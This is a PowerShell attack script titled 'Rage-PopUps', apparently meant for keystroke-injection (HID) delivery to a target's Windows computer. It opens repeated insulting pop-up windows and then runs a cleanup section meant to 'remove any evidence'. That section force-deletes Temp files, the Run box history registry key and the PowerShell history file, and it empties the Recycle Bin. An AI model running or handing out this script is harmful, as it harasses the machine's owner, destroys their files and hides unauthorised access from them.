############################################################################################################################################################                      
#                                       
# Title        : Rage-PopUps      
# Author       : I am Jakoby      
# Version      : 1.0             
# Category     : Prank           
# Mode         : HID              
#                               
#                                                                                                                       
#                                  
#
#                                                                                    
#  github.com/I-Am-Jakoby                                                           
#  twitter.com/I_Am_Jakoby                                                                                               
#  instagram.com/i_am_jakoby                                                                             
#  youtube.com/c/IamJakoby                                                                                  
############################################################################################################################################################

<#
.SYNOPSIS
	This script will open a series of pop ups in order to taunt your target. I wrote it initially to target call center scammers

.DESCRIPTION 
	This program is to taunt your target. Below are a series insults you can modify as you like. The program will generate a PopUp 
	for each one of them. 
#>

#------------------------------------------------------------------------------------------------------------------------------------

Add-Type -AssemblyName System.Windows.Forms

# The number of times you want it to cycle through your list of questions

$cycles = 5

# List as many questions here as you like, it will cycke through all of them

$msgs = @(
"Hey pal!"
"You think you can get rid of me?"
"I don't engage in mental combat with the unarmed."
"Kudos for trying bud."
"Roses are red, Violets are blue. I've got five fingers, The middle one is for you."
"Brains aren't everything. In your case they're nothing."
"I'm not insulting you. I'm describing you."
"On a scale of North Korea to America, how free are you tonight?"
"Kidding i'm gonna stay wheather you like it or not."
"Calling you an idiot would be an insult to all stupid people."
"I'm watching you"
"Okay, i'm done now"
"Kidding ;)"
"I'm never leaving"
)

for ($i=1; $i -le $cycles; $i++) {

Foreach ($msg in $msgs) {
[System.Windows.Forms.MessageBox]::Show($msg , "You're-a-Loser.exe" , 4 , 'Warning')
}
}

#----------------------------------------------------------------------------------------------------

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
